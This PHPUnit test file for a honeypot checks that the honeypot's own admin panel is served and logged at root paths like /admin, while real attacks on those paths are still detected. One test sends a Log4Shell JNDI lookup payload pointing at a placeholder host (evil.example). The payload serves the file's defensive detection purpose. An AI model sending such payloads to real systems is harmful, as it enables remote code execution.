<?php

declare(strict_types=1);

namespace Funnypot\Tests\App;

use Funnypot\App\Config\AppConfig;
use Funnypot\App\Http\HoneypotController;
use Funnypot\Tests\App\Identity\IdentityTestSupport;
use Funnypot\App\Llm\LlmClient;
use Funnypot\App\Llm\LlmFakeResponder;
use Funnypot\App\Llm\LlmOutputSanitizer;
use Funnypot\App\Llm\LlmResponseProfiles;
use Funnypot\App\Llm\ProbeClassifier;
use Funnypot\App\Llm\ProbeGate;
use Funnypot\App\Llm\VelocityTracker;
use Funnypot\App\Render\PageShellRenderer;
use Funnypot\App\Render\PanelRoute;
use Funnypot\App\Render\SkinSet;
use Funnypot\App\Render\Skins\AdminLteSkin;
use Funnypot\App\Render\Skins\GrafanaSkin;
use Funnypot\App\Storage\LlmFakeCache;
use Funnypot\App\Storage\SqliteHitStore;
use Funnypot\App\ThreatIntel\AttackClassifier;
use Funnypot\Core\RequestContext;
use Funnypot\Core\Support\Chrome\GenericSkin;
use Funnypot\Core\Support\Chrome\PhpMyAdminSkin;
use Funnypot\Core\Support\Chrome\WordpressSkin;
use PHPUnit\Framework\TestCase;

require_once dirname(__DIR__, 2) . '/demo/lib/geo.php';

/**
 * The honeypot's own admin panel must win its own root-mounted paths (/admin, /dashboard, …) over the
 * engine's nuclei-reflection corpus, which also matches those bare mount segments and would otherwise
 * serve + label them 'nuclei' — the reported dashboard mislabel. Precedence is root-anchored so it
 * never captures a product-family emulator the engine owns (/wp-admin/admin.php), and it yields to the
 * engine when a genuine attack payload is aimed at a panel path so injections are still detected.
 */
final class PanelPrecedenceTest extends TestCase
{
    /** @var string[] */
    private array $tmp = [];

    protected function setUp(): void
    {
        if (!extension_loaded('pdo_sqlite')) {
            self::markTestSkipped('ext-pdo_sqlite not loaded');
        }
    }

    protected function tearDown(): void
    {
        foreach ($this->tmp as $f) {
            foreach (['', '-wal', '-shm', '.sqlite', '.sqlite-wal', '.sqlite-shm'] as $s) {
                @unlink($f . $s);
            }
        }
        $this->tmp = [];
    }

    private function tmpPath(string $n): string
    {
        $p = sys_get_temp_dir() . "/fppanelprec_{$n}_" . bin2hex(random_bytes(6));
        $this->tmp[] = $p;

        return $p;
    }

    // --- mountedAtRoot: the tight, root-anchored predicate the controller gives precedence by ---

    /** @dataProvider rootMounts */
    public function test_mounted_at_root_true(string $path): void
    {
        self::assertTrue(PanelRoute::mountedAtRoot($path), "$path should be a root-mounted panel path");
    }

    /** @return array<int,array{0:string}> */
    public static function rootMounts(): array
    {
        return [
            ['/admin'], ['/admin/'], ['/admin.php'], ['/admin/login'], ['/admin/config.php'],
            ['/administrator'], ['/administrator/index.php'],
            ['/dashboard'], ['/dashboard/'], ['/manage'], ['/panel'], ['/panel/index.php'],
            ['/console'], ['/console.php'], ['/cp'], ['/cp/'],
            ['/admin?next=/x'],   // a query string is display-only and is stripped before matching
        ];
    }

    /** @dataProvider notRootMounts */
    public function test_mounted_at_root_false(string $path): void
    {
        self::assertFalse(PanelRoute::mountedAtRoot($path), "$path must NOT be treated as a root-mounted panel path");
    }

    /** @return array<int,array{0:string}> */
    public static function notRootMounts(): array
    {
        return [
            // Product-family emulators the engine owns — a mount segment appears DEEPER, never at the root.
            ['/wp-admin/admin.php'], ['/wp-login.php'], ['/phpmyadmin'], ['/phpmyadmin/index.php'],
            ['/grafana/login'],
            // A mount not at the root keeps its existing (non-precedence) behaviour.
            ['/foo/admin'], ['/app/dashboard'],
            // Not a mount at all.
            ['/'], [''], ['/wp-content/uploads'], ['/administer'], ['/admin-notes'],
        ];
    }

    // --- controller precedence: panel wins the nuclei corpus at its mount, but yields to attacks ---

    private function controller(SqliteHitStore $store): HoneypotController
    {
        $config = AppConfig::fromEnv($this->tmpPath('base'));
        $geo = new \Geo($this->tmpPath('geo') . '.csv');
        $decoys = dirname(__DIR__, 2) . '/demo/decoys';

        // The production skin set (WordPress/phpMyAdmin/Grafana are more specific; AdminLTE is the
        // custom-admin-panel fallback), so /admin resolves to the honeypot's own panel.
        $skins = new SkinSet(
            [new WordpressSkin(), new PhpMyAdminSkin(), new GrafanaSkin(), new AdminLteSkin()],
            new GenericSkin()
        );
        $llmFakes = new LlmFakeResponder(
            new ProbeGate(new ProbeClassifier(), new VelocityTracker(), $store),
            new LlmFakeCache($this->tmpPath('cache') . '.sqlite'),
            new LlmClient('http://sidecar/completion', 1500, 320, null, fn (): array => ['status' => 200, 'body' => '{}']),
            new LlmOutputSanitizer(),
            $store,
            new LlmResponseProfiles('nginx', 'root ::= "<"', 'root ::= "{"', new PageShellRenderer($skins), 'root ::= "{"'),
            'v1',
            4,
            7,
            'a1',
        );

        return new HoneypotController(
            $store,
            $geo,
            $config,
            $decoys,
            IdentityTestSupport::coreConfigFactory(),
            null,
            null,
            null,
            $llmFakes,
            new AttackClassifier(),
        );
    }

    /** @return array<int,array<string,mixed>> logged rows whose path equals $path */
    private function rowsFor(SqliteHitStore $store, string $path): array
    {
        return array_values(array_filter(
            $store->delta(0)['rows'],
            static fn (array $r): bool => ($r['path'] ?? '') === $path
        ));
    }

    public function test_admin_root_is_served_and_logged_as_panel_not_nuclei(): void
    {
        // The reported bug: /admin is shadowed by the engine's nuclei-reflection corpus (opencart/etc.),
        // served + logged 'nuclei', hiding the honeypot's own admin panel. It must now be the panel.
        $store = new SqliteHitStore($this->tmpPath('hits') . '.sqlite');
        $c = $this->controller($store);

        // @ suppresses the http_response_code()/header() "headers already sent" warnings — PHPUnit's
        // printer has already written to stdout, so ResponseEmitter cannot really set them under test.
        ob_start();
        @$c->handle(new RequestContext('GET', '/admin', '', ['User-Agent' => 'curl/8.0']), '9.9.9.9', 'off');
        ob_end_clean();

        $rows = $this->rowsFor($store, '/admin');
        self::assertNotEmpty($rows, '/admin should have been logged');
        // Every /admin row is the panel — none carries a nuclei template id.
        foreach ($rows as $r) {
            foreach (($r['templates'] ?? []) as $tid) {
                self::assertSame('panel', $tid, "/admin must be tagged 'panel', not a nuclei template id ($tid)");
            }
        }
        $panel = array_values(array_filter($rows, static fn (array $r): bool => ($r['event'] ?? '') === 'panel'));
        self::assertNotEmpty($panel, "/admin must be logged with event 'panel'");
        self::assertSame(['panel'], $panel[0]['templates'] ?? null);
    }

    public function test_deep_panel_path_stored_tag_is_panel(): void
    {
        // Acceptance criterion: an /admin/... panel request's stored tag is the panel, not nuclei.
        $store = new SqliteHitStore($this->tmpPath('hits') . '.sqlite');
        $c = $this->controller($store);

        ob_start();
        @$c->handle(new RequestContext('GET', '/admin/bank', '', ['User-Agent' => 'curl/8.0']), '9.9.9.9', 'off');
        ob_end_clean();

        $rows = $this->rowsFor($store, '/admin/bank');
        self::assertNotEmpty($rows);
        $panel = array_values(array_filter($rows, static fn (array $r): bool => ($r['event'] ?? '') === 'panel'));
        self::assertNotEmpty($panel, "a deep /admin path is tagged 'panel'");
        self::assertSame(['panel'], $panel[0]['templates'] ?? null);
        foreach ($rows as $r) {
            foreach (($r['templates'] ?? []) as $tid) {
                self::assertSame('panel', $tid);
            }
        }
    }

    public function test_genuine_attack_on_a_panel_path_is_not_relabelled_panel(): void
    {
        // No-regression guard: the panel must not shadow a real injection aimed at an /admin path. The
        // engine's attack corpus catches it and serves + tags it as the attack, not 'panel'. Use a
        // NON-reflecting attack (log4shell/RCE) so this stays valid regardless of isolatedOrigin — the
        // reflecting class (XSS/open-redirect) is gated by that flag (FP-0159) and is suppressed when the
        // box does not opt in, which is orthogonal to the panel-precedence behaviour under test here.
        $store = new SqliteHitStore($this->tmpPath('hits') . '.sqlite');
        $c = $this->controller($store);

        ob_start();
        @$c->handle(
            new RequestContext('GET', '/admin/search', 'x=${jndi:ldap://evil.example/a}', ['User-Agent' => 'curl/8.0']),
            '9.9.9.9',
            'off'
        );
        ob_end_clean();

        $rows = $this->rowsFor($store, '/admin/search');
        self::assertNotEmpty($rows);
        $attack = array_values(array_filter($rows, static function (array $r): bool {
            foreach (($r['templates'] ?? []) as $tid) {
                if (strncmp((string) $tid, 'attack-', 7) === 0) {
                    return true;
                }
            }

            return false;
        }));
        self::assertNotEmpty($attack, 'a genuine attack on a panel path must still be detected by the engine');
        foreach ($rows as $r) {
            self::assertNotSame('panel', $r['event'] ?? '', 'an attack on a panel path must not be relabelled panel');
        }
    }
}
